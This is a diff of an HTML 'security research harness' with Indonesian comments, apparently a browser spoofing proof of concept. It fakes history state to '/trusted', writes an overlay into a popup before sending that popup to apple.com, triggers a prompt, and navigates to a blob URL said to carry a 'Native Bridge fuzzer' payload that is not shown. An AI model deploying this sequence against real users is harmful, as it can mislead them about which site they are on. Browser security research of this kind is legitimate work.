@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="utf-8">
-    <title>Resilient Security Research Harness - Advanced</title>
+    <title>Resilient Security Research Harness - Cross-Origin Safe</title>
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; padding: 2em; background: #020617; color: #f8fafc; }
         .container { max-width: 800px; margin: 40px auto; background: #0f172a; padding: 2.5em; border-radius: 12px; border: 1px solid #1e293b; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.9); }
@@ -19,15 +19,15 @@
 <body>
 
 <div class="container">
-    <h2>Advanced Security Research Harness</h2>
-    <span class="badge">Optimized Asynchronous Flow & Robust Error Control</span>
+    <h2>Resilient Security Research HarnessT</h2>
+    <span class="badge">Cross-Origin Protected Flow & Robust Error Control</span>
     
     <div id="panel">
         <strong>[Trusted State Panel Active]</strong><br>
         State history lokal berhasil diperbarui ke /trusted.
     </div>
 
-    <p>Harness ini mengoptimalkan sinkronisasi timing terstruktur, penanganan pop-up asinkron, serta injeksi payload fuzzer Native Bridge untuk pengujian lingkungan riset lokal.</p>
+    <p>Harness ini mengoptimalkan sinkronisasi timing terstruktur, penanganan pop-up asinkron dengan pengamanan lintas-asal, serta injeksi payload fuzzer Native Bridge.</p>
     
     <button class="btn" id="executeAllBtn">Jalankan Rangkaian Pengujian</button>
     
@@ -44,7 +44,7 @@ function logTerm(msg) {
     console.log('[AdvancedHarness] ' + msg);
 }
 
-// Pemantauan Lifecycle Pageshow dengan kalibrasi rAF ganda
+// Pemantauan Lifecycle Pageshow
 window.addEventListener('pageshow', (event) => {
     logTerm('Event "pageshow" tertangkap. (persisted: ' + event.persisted + ')');
     requestAnimationFrame(() => {
@@ -67,35 +67,39 @@ document.getElementById('executeAllBtn').onclick = async function() {
         logTerm('[1/4] Error pushState: ' + err.message);
     }
 
-    // 2. Pengelolaan Jendela Popup dengan Sinkronisasi Dokumen Aman
+    // 2. Pengelolaan Jendela Popup dengan Pengamanan Lintas-Asal (SOP)
     logTerm('[2/4] Menginisialisasi konteks popup asinkron...');
     try {
         const newTab = window.open("about:blank", "_blank");
         if (newTab) {
+            // Tulis konten lokal sebelum navigasi eksternal dilakukan
             newTab.document.write(`
                 <!DOCTYPE html>
                 <html>
-                <head><title>Research Overlay - Stabilized</title></head>
+                <head><title>Research Overlay - Initial</title></head>
                 <body style="margin:0;padding:0;background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center">
                   <div>
                     <h1 style="font-size:42px;font-weight:bold;color:red;margin:0 0 20px 0">SECURITY RESEARCH OVERLAY</h1>
-                    <p style="font-size:28px;font-weight:bold;color:#007aff;margin:10px 0">SYNC TIMING ACTIVE</p>
+                    <p style="font-size:28px;font-weight:bold;color:#007aff;margin:10px 0">INITIALIZING NAVIGATION...</p>
                   </div>
                 </body>
                 </html>
             `);
             newTab.document.close();
-            logTerm('[2/4] Konten overlay berhasil dirender di tab baru.');
+            logTerm('[2/4] Konten overlay awal berhasil dirender di tab baru.');
 
-            // Menggunakan penundaan terkalibrasi untuk stabilitas transisi
+            // Transisi terkalibrasi menuju URL eksternal
             setTimeout(() => {
                 try {
                     newTab.location.href = "https://apple.com";
                     logTerm('[2/4] Navigasi eksternal ke apple.com dipicu.');
+                    
+                    // Catatan: Mencoba melakukan document.write setelah baris ini 
+                    // akan memicu DOMException karena batasan Same-Origin Policy.
                 } catch (navErr) {
                     logTerm('[2/4] Gagal memicu navigasi eksternal: ' + navErr.message);
                 }
-            }, 300);
+            }, 400);
         } else {
             logTerm('[2/4] Peringatan: Popup diblokir oleh kebijakan peramban.');
         }
@@ -112,7 +116,7 @@ document.getElementById('executeAllBtn').onclick = async function() {
         } catch (err) {
             logTerm('[3/4] Prompt dilewati atau diblokir.');
         }
-    }, 700);
+    }, 800);
 
     // 4. Inisialisasi Kontainer Blob & Fuzzer Native Bridge
     logTerm('[4/4] Mempersiapkan payload Native Bridge Fuzzer...');
@@ -220,7 +224,7 @@ document.getElementById('executeAllBtn').onclick = async function() {
 
         setTimeout(function() {
             location.href = blobUrl;
-        }, 1000);
+        }, 1200);
 
     } catch (e) {
         logTerm('[-] Gagal memproses navigasi blob: ' + e.message);
